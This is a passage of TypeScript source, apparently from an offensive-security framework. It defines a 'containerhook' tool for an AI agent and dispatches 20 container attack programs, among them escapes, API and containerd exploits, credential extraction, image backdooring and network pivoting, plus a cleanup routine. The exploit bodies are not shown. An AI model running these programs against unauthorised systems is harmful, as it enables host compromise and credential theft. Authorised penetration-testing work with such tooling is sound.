  const volumes = await run("docker", ["volume", "ls", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (volumes.exitCode === 0) {
    const ids = volumes.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike volumes: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["volume", "rm", ...ids], timeout)
      output.push(`    Removed ${ids.length} volume(s)`)
    }
  }

  const networks = await run("docker", ["network", "ls", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (networks.exitCode === 0) {
    const ids = networks.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike networks: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["network", "rm", ...ids], timeout)
      output.push(`    Removed ${ids.length} network(s)`)
    }
  }

  if (dryRun) output.push(`\n[*] Dry run — no resources were removed`)

  return { output: output.join("\n"), findings }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const ContainerhookTool = Tool.define("containerhook", {
  description: `Execute a container security program. 20 programs: Docker/OCI runtime audit, image scan, registry dump, escape detection (socket/cgroup/namespace), exposed API exploit, containerd exploit, Swarm enum, network pivot, volume dump, credential extraction, image backdoor, Podman enum, BuildKit cache dump. Available: ${programKeys.join(", ")}. ALWAYS run cleanup_container before leaving.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "Container program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    if (
      !Bun.which("docker") &&
      ![
        "compose_secrets",
        "docker_api_exploit",
        "podman_enum",
        "cgroup_escape",
        "container_pivot",
        "namespace_exploit",
        "containerd_exploit",
      ].includes(params.program)
    ) {
      return {
        title: `containerhook: ${params.program}`,
        output: "docker not found. Install: https://docs.docker.com/engine/install/",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      docker_enum: () => dockerEnum(params.args, params.timeout_seconds),
      docker_escape: () => dockerEscape(params.args, params.timeout_seconds),
      image_scan: () => imageScan(params.args, params.timeout_seconds),
      registry_dump: () => registryDump(params.args, params.timeout_seconds),
      runtime_audit: () => runtimeAudit(params.args, params.timeout_seconds),
      compose_secrets: () => composeSecrets(params.args, params.timeout_seconds),
      docker_api_exploit: () => dockerApiExploit(params.args, params.timeout_seconds),
      container_network: () => containerNetwork(params.args, params.timeout_seconds),
      overlay_inspect: () => overlayInspect(params.args, params.timeout_seconds),
      podman_enum: () => podmanEnum(params.args, params.timeout_seconds),
      build_cache_dump: () => buildCacheDump(params.args, params.timeout_seconds),
      cgroup_escape: () => cgroupEscape(params.args, params.timeout_seconds),
      container_creds: () => containerCreds(params.args, params.timeout_seconds),
      swarm_enum: () => swarmEnum(params.args, params.timeout_seconds),
      containerd_exploit: () => containerdExploit(params.args, params.timeout_seconds),
      image_backdoor: () => imageBackdoor(params.args, params.timeout_seconds),
      volume_dump: () => volumeDump(params.args, params.timeout_seconds),
      container_pivot: () => containerPivot(params.args, params.timeout_seconds),
      namespace_exploit: () => namespaceExploit(params.args, params.timeout_seconds),
      cleanup_container: () => cleanupContainer(params.args, params.timeout_seconds),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `containerhook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `containerhook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
